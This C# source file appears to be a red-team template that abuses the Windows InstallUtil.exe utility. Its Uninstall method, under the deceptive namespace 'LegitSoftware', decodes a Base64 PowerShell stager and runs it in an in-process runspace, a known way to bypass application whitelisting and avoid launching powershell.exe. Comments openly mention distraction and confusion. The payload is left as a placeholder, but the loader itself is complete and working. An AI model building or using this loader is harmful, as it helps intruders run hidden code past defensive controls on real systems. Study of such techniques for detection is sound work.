
using System;
using System.Text;

//Adding libraries for powershell stuff
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace LegitSoftware

{
    //Allows usage of InstallUtil.exe
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        static string RunPS(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }



        public static void Main()
        {
            // Base64 encoded launcher goes into the 'stager' variable
            string stager = "-!!----<Enter your Base64 PowerShell code here>-!!---------";
            var decodedScript = Encoding.Unicode.GetString(Convert.FromBase64String(stager));

             string results = RunPS(decodedScript);
        }
    }
}
